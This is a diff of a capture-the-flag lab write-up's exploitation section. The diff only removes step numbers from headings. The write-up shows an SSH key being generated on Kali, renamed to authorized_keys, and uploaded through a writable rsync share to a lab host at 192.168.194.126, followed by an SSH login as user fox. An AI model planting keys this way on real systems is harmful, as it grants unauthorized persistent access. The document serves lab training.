@@ -67,7 +67,7 @@ give us a remote connection to the machine.
 
 # Exploitation
 
-1. Generate SSH Key
+Generate SSH Key
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail]
 └─$ ssh-keygen                                       
@@ -93,12 +93,12 @@ The key's randomart image is:
 +----[SHA256]-----+
 ~~~
 
-2. Copy our .ssh directory locally
+Copy our .ssh directory locally
 ~~~
 cp -R /home/kali/.ssh .
 ~~~
 
-3. Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
+Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail]
 └─$ cd .ssh
@@ -106,12 +106,12 @@ cp -R /home/kali/.ssh .
 └─$ mv id_rsa.pub authorized_keys
 ~~~
 
-4. Upload the .ssh file (containing authorized_keys) to Rsync
+Upload the .ssh file (containing authorized_keys) to Rsync
 ~~~
 rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
 ~~~
 
-5. SSH into the target machine
+SSH into the target machine
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
 └─$ ssh -i ./id_rsa fox@192.168.194.126
